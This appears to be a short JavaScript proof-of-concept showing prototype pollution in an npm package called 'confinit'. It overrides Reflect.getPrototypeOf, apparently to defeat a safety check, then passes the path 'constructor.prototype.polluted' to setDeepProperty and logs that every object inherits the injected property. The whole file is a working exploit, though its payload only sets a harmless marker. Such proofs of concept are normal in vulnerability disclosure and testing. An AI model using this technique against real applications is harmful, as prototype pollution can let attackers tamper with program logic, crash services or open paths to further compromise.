Reflect.getPrototypeOf = () => false;
const root = require('confinit');
const payload = 'constructor.prototype.polluted';
console.log({}.polluted);
root.setDeepProperty({}, payload, 'yes');
console.log({}.polluted);